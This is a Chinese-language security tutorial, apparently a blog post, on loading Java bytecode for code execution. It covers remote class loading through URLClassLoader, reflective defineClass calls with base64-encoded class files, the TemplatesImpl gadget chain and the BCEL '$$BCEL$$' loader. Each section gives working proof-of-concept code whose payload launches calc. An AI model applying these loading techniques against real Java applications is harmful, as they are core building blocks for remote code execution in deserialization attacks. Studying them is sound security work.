## 什么是java字节码

严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。

众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。

甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行：

![image-20220404150301634](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404150301634.png)

这里**所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内**。

## 利用URLClassLoader加载远程class文件

这个很基础，直接上代码：

先编写一个evil.java并编译为class文件，python开一个http服务

```java
import java.io.IOException;

public class evil {
    public evil() throws IOException{
        Runtime.getRuntime().exec("calc");
    }
}
```

`evilClassLoader。java`

```java
import java.net.URL;
import java.net.URLClassLoader;
public class evilClassLoader {
    public static void main( String[] args ) throws Exception {
        URL[] urls = {new URL("http://127.0.0.1:8000/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class c = loader.loadClass("evil");
        c.newInstance();
    }
}
```

![image-20220404154323775](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404154323775.png)

作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。

## 利用ClassLoader#defineClass直接加载字节码

在类加载器的学习中，我们知道不管是加载远程class文件，还是本地的class或jar文件，Java会经历三个方法的调用：

![image-20220404155227824](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404155227824.png)

其中核心的部分是 defineClass ，他决定了如何将一段字节流转变成一个Java类。

```java
private native Class<?> defineClass1(String name, byte[] b, int off, int len,
                                         ProtectionDomain pd, String source);
```

这里我们了解其用法就可以了，写一个demo：

`evil.java`

```java
import java.io.IOException;

public class evil {
    public evil() throws IOException{
        Runtime.getRuntime().exec("calc");
    }
}
```

将其编译为class文件后再base64，可以在linux上执行`cat evil.class | base64`

![image-20220404160354736](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404160354736.png)

`declassloader.java`

```java
import java.lang.reflect.Method;
import java.util.Base64;

public class declassloader {
    public static void main(String[] args) throws Exception{
        Class clazz = Class.forName("java.lang.ClassLoader");
        Method defineClassMethod = clazz.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwABwAIBwAXDAAYABkBAARjYWxjDAAaABsBAARldmlsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAABAAEAAUADQAGAAsAAAAEAAEADAABAA0AAAACAA4=");
        Class targetClass = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),"evil",bytes,0,bytes.length);
        targetClass.newInstance();

    }
}
```

![image-20220404165840686](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404165840686.png)

在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我

们常用的一个攻击链 TemplatesImpl 的基石。

## 利用TemplatesImpl加载字节码

在TemplatesImpl类中定义了一个内部静态类TransletClassLoader

```java
 static final class TransletClassLoader extends ClassLoader {
        private final Map<String,Class> _loadedExternalExtensionFunctions;

         TransletClassLoader(ClassLoader parent) {
             super(parent);
            _loadedExternalExtensionFunctions = null;
        }

        TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
            super(parent);
            _loadedExternalExtensionFunctions = mapEF;
        }

        public Class<?> loadClass(String name) throws ClassNotFoundException {
            Class<?> ret = null;
            // The _loadedExternalExtensionFunctions will be empty when the
            // SecurityManager is not set and the FSP is turned off
            if (_loadedExternalExtensionFunctions != null) {
                ret = _loadedExternalExtensionFunctions.get(name);
            }
            if (ret == null) {
                ret = super.loadClass(name);
            }
            return ret;
         }

        /**
         * Access to final protected superclass member from outer class.
         */
        Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
    }
```

这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。

往上跟一下，`TemplatesImpl`的`defineTransletClasses`方法

![image-20220404171633437](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404171633437.png)

而`defineTransletClasses`在`getTransletInstance`中调用：

![image-20220404171808043](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404171808043.png)

再往上追，`getTransletInstance`又在`newTransformer`中被调用

![image-20220404180043671](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404180043671.png)

此时`newTransformer`已经是public方法了外部可以直接调用，所以利用链：

```
TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() -> 
TemplatesImpl#defineTransletClasses()-> 
TransletClassLoader#defineClass()
```

由此我们构造POC：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class temp {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAApldmlsMS5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEABWV2aWwxAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAQAAQAEQANABIACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});
        setFieldValue(templates,"_name","snakin");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        templates.newTransformer();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

首先我们利用TemplatesImpl的类构造器直接生成对象，后续利用反射设置属性

`setFieldValue`是利用反射给私有变量赋值

```java
public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
}
```

初始化之后来到getTransletInstance，这里有限制条件

```java
if (_name == null) return null;
if (_class == null) defineTransletClasses();
```

我们需要满足`_name`不为空，所以给它设置一个值；同时`_class`默认为null，这里不用管它

```java
setFieldValue(templates,"_name","snakin");
```

进入`defineTransletClasses`：

```java
if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }
```

这里需要满足`_bytecodes`不为null，继续往下

```java
TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
```

`run()`方法中调用了`_tfactory.getExternalExtensionsMap()`，所以`_tfactory`不能为`null`：

```java
private transient TransformerFactoryImpl _tfactory = null;
```

构造一下：

```java
setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
```

之后：

![image-20220404182854852](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404182854852.png)

这里就会调用自定义的 ClassLoader 去加载 `_bytecodes` 中的 `byte[]`，因此`_bytecodes` 是我们要加载的类的字节码数组。

需要注意的是：**TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。**

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class evil1 extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    public evil1 () throws Exception  {
        super();
        Runtime.getRuntime().exec("calc");
    }
}
```

同理，编译为class文件之后再base64，之后填入POC运行即可

![image-20220404183508011](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404183508011.png)

## 利用BCEL ClassLoader加载字节码

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。

p神在博客中对它有详细的讲解：[BCEL Classloader去哪了](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

我们可以通过BCEL提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码。

写一个demo看一下：

```java
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;


public class EvilBCEL {
    public static void main(String[] args) throws Exception {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String code = Utility.encode(javaClass.getBytes(),true);
        new ClassLoader().loadClass("$$BCEL$$"+code).newInstance();
    }
}
```

```java
import java.io.IOException;

public class evil {
    public evil() throws IOException{
        Runtime.getRuntime().exec("calc");
    }
}
```

要加上`$$BCEL$$`是因为：

BCEL这个包中有个有趣的类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个ClassLoader，但是他重写了Java内置的`ClassLoader#loadClass()`方法。

在`ClassLoader#loadClass()`中，其会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行decode。

![image-20220404204024847](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220404204024847.png)

最后需要注意`Java 8u251`之后`ClassLoader`就被删除了，如果要用到的话注意jdk的版本。









参考：

https://blog.csdn.net/rfrder/article/details/119763746
